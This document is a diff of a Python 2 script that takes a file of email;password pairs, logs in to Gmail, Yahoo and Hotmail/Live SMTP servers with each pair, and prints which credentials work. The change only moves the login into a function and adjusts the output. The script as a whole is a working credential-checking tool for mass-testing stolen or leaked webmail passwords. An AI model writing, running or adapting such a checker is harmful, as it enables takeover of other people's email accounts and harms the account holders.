@@ -16,31 +16,35 @@ import sys
 import smtplib
 smtp_servers = ['smtp.gmail.com:587','smtp.mail.yahoo.com:587','smtp.live.com:587']
 
-for l in open(sys.argv[1]):
-	dataLogin = l.replace('\n','').split(';')  
-	mail   = dataLogin[0] 
-	passwd = dataLogin[1]
-	if ("@gmail." in mail):
-		s = smtplib.SMTP(smtp_servers[0])
-	elif ("@yahoo." in mail):
-		s = smtplib.SMTP(smtp_servers[1])
-	elif ("@hotmail." in mail) or ("@live." in mail):
-		s = smtplib.SMTP(smtp_servers[2])	
-	else:
-		print 'Unlisted mail server !'
-	
-
+def login(s,mail,passwd):
 	s.starttls()
 	#s.set_debuglevel(1) 
 	try:
 		s.login(mail,passwd)
 	except smtplib.SMTPAuthenticationError as e:
 		if e[0] == 534:
-			print "[+] Login OK !"
-			print "[+] Login: %s ; Passwd: %s"%(mail,passwd)
+			sys.stdout.write('\r[+] Login: %s ; Passwd: %s  [OK] ! 											\n'%(mail,passwd))
 		elif e[0] == 535:
 			sys.stdout.write('\r[-] Erro : Mail[%s] and Password[%s] not accepted !'%(mail,passwd))
 		else:
-			print "Undetermined Error !"
+			sys.stdout.write('\r[-]Undetermined Error !')
 
 	s.quit()
+
+for l in open(sys.argv[1]):
+	dataLogin = l.replace('\n','').split(';')  
+	mail   = dataLogin[0] 
+	passwd = dataLogin[1]
+	if ("@gmail." in mail):
+		s = smtplib.SMTP(smtp_servers[0])
+		login(s,mail,passwd)
+	elif ("@yahoo." in mail):
+		s = smtplib.SMTP(smtp_servers[1])
+		login(s,mail,passwd)
+	elif ("@hotmail." in mail) or ("@live." in mail):
+		s = smtplib.SMTP(smtp_servers[2])	
+		login(s,mail,passwd)
+	else:
+		sys.stdout.write('\rUnlisted mail server [%s] !'%mail)
+		pass
+	
